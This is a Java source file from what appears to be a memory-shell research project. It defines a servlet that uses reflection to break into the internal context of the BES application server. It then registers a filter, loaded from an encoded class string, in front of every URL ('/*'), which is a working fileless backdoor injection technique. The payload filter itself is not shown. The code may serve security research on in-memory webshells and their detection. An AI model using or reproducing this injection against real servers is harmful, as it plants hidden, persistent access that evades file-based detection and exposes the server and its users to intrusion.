package org.su18.memshell.test.bes;

import com.bes.enterprise.util.descriptor.web.FilterDef;
import com.bes.enterprise.util.descriptor.web.FilterMap;
import com.bes.enterprise.webtier.core.CloudServletContext;

import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

import static org.su18.memshell.test.bes.DynamicUtils.FILTER_CLASS_STRING;

/**
 * BES ≈ Tomcat，跟 GlassFish 也是一家人，在其基础上稍微改改
 * 测试版本 BES-LITE-9.5.0.382
 *
 * @author su18
 */
public class AddBESFilter extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {


		String         filterName     = "su18BESFilter";
		String         urlPattern     = "/*";
		ServletContext servletContext = req.getServletContext();

		CloudServletContext context = null;

		try {

			// 获取 Context
			while (context == null) {
				Field f = servletContext.getClass().getDeclaredField("context");
				f.setAccessible(true);
				Object object = f.get(servletContext);

				if (object instanceof CloudServletContext) {
					context = (CloudServletContext) object;
				} else if (object instanceof ServletContext) {
					servletContext = (ServletContext) object;
				}
			}

			// 创建自定义 Filter 对象
			Filter filter = (Filter) DynamicUtils.getClass(FILTER_CLASS_STRING).newInstance();

			// 创建 FilterDef 对象
			FilterDef filterDef = new FilterDef();
			filterDef.setFilterName(filterName);
			filterDef.setFilter(filter);
//			filterDef.setFilterClass(filter.getClass());

			// 创建 ApplicationFilterConfig 对象
			Constructor<?>[] constructor = Class.forName("com.bes.enterprise.webtier.core.ApplicationFilterConfig").getDeclaredConstructors();
			constructor[0].setAccessible(true);
			Object config = constructor[0].newInstance(context, filterDef);

			// 创建 FilterMap 对象
			FilterMap filterMap = new FilterMap();
			filterMap.setFilterName(filterName);
			filterMap.setDispatcher(DispatcherType.REQUEST.name());
			filterMap.addURLPattern(urlPattern);


			// 反射将 ApplicationFilterConfig 放入 StandardContext 中的 filterConfigs 中
			Field filterConfigsField = context.getClass().getDeclaredField("filterConfigs");
			filterConfigsField.setAccessible(true);
			HashMap<String, Object> filterConfigs = (HashMap<String, Object>) filterConfigsField.get(context);
			filterConfigs.put(filterName, config);

			// 反射将 FilterMap 放入 StandardContext 中的 filterMaps 中
			Field filterMapField = context.getClass().getDeclaredField("filterMaps");
			filterMapField.setAccessible(true);
			Object object = filterMapField.get(context);

			Class  c = Class.forName("com.bes.enterprise.webtier.core.CloudServletContext$ContextFilterMaps");
			Method m = c.getDeclaredMethod("addBefore", FilterMap.class);
			m.setAccessible(true);
			m.invoke(object, filterMap);

			resp.getWriter().println("bes filter added");

		} catch (Exception e) {
			e.printStackTrace();
		}

	}
}